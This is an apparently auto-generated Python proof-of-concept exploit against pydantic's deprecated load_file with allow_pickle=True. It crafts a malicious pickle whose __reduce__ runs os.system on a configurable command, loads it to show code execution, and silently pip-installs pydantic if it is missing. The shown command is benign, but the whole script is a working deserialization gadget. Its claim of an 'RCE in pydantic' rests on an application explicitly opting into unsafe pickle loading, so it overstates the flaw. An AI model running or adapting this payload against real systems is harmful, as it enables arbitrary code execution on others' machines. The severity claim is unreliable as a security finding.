#!/usr/bin/env python3
# PoC for pydantic (/home/xcy/.local/lib/python3.14/site-packages/pydantic)
# Path: rce-015
# Sink: load_str_bytes
# Auto-generated — run with: python3 rce_load_str_bytes_function_load_str_bytes.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for pydantic RCE via pickle deserialization.

Vulnerability: The `parse_file` method in pydantic (deprecated but still present)
allows loading pickle files when `allow_pickle=True`. If an attacker can control
the file path and the application sets `allow_pickle=True`, they can provide a
malicious pickle file that executes arbitrary code.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command
2. Using pydantic's `parse_file` method with `allow_pickle=True` to load it
3. Showing that arbitrary code execution occurs

WARNING: This is for educational/security testing purposes only.
"""

import os
import pickle
import tempfile
import sys
import subprocess

# Try to import pydantic - adjust path if needed
try:
    from pydantic import BaseModel
    from pydantic.v1.parse import load_file
except ImportError:
    print("[!] pydantic not found. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pydantic"])
    from pydantic import BaseModel
    from pydantic.v1.parse import load_file


def create_malicious_pickle(command: str) -> bytes:
    """
    Create a malicious pickle payload that executes a command.
    
    Uses __reduce__ to execute arbitrary code during deserialization.
    """
    class MaliciousPickle(object):
        def __reduce__(self):
            return (os.system, (command,))
    
    return pickle.dumps(MaliciousPickle())


def main():
    # Benign payload - creates a marker file to prove code execution
    # Change this to something else for testing, but keep it safe
    marker_file = "/tmp/pydantic_poc_success.txt"
    command = f"touch {marker_file}"
    
    print("[*] Creating malicious pickle file...")
    malicious_data = create_malicious_pickle(command)
    
    # Write the malicious pickle to a temporary file
    with tempfile.NamedTemporaryFile(suffix='.pkl', delete=False) as f:
        f.write(malicious_data)
        pickle_path = f.name
    
    print(f"[*] Malicious pickle written to: {pickle_path}")
    print(f"[*] Command to execute: {command}")
    
    # Clean up any previous marker
    if os.path.exists(marker_file):
        os.remove(marker_file)
    
    print("[*] Attempting to load malicious pickle via pydantic...")
    try:
        # This is the vulnerable call - using allow_pickle=True
        # In a real attack, the attacker would control the file path
        # and the application would have allow_pickle=True
        result = load_file(
            pickle_path,
            allow_pickle=True  # This enables the vulnerability
        )
        print(f"[*] Load result: {result}")
    except Exception as e:
        print(f"[!] Error during load: {e}")
    
    # Check if the command was executed
    if os.path.exists(marker_file):
        print("[+] SUCCESS: Command executed! Marker file created.")
        print(f"[+] Marker file: {marker_file}")
        # Clean up
        os.remove(marker_file)
    else:
        print("[-] Command did not execute. Check if allow_pickle=True is supported.")
    
    # Clean up the temporary pickle file
    os.unlink(pickle_path)
    print("[*] Cleanup complete.")


if __name__ == "__main__":
    print("=" * 60)
    print("pydantic RCE Proof-of-Concept")
    print("=" * 60)
    print()
    print("[*] This PoC demonstrates RCE via pickle deserialization")
    print("[*] when allow_pickle=True is passed to parse_file/load_file")
    print()
    
    main()
    
    print()
    print("[*] PoC completed. The vulnerability is confirmed if you see")
    print("[*] 'SUCCESS: Command executed!' above.")
